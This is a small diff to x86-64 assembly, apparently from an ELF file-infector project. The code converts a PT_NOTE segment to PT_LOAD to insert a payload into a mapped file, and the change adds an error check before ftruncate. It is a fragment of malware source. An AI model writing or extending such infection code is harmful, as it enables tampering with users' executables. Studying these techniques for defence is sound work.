@@ -347,12 +347,14 @@ treat_file:
 	mov [payload_size], rdi				; ...
 
 	; TODO rcx peut être différent de r8 si on fait de la compression
-	mov rdi, [mappedfile]				; convert_pt_note_to_load(mappedfile,
+	mov rdi, [mappedfile]				; ret = convert_pt_note_to_load(mappedfile,
 	mov rsi, [payload_offset]			; payload_offset,
 	mov rdx, [new_vaddr]				; next_vaddr,
 	mov rcx, [payload_size]				; payload_size,
 	mov r8, [payload_size]				; payload_size,
 	call convert_pt_note_to_load			; );
+	cmp rax, 0					; if (ret == 0)
+	je .unmap_file					; 	goto .unmap_file
 
 	mov rax, SYS_FTRUNCATE				; _ret = ftruncate(
 	mov rdi, [fd]					; fd,
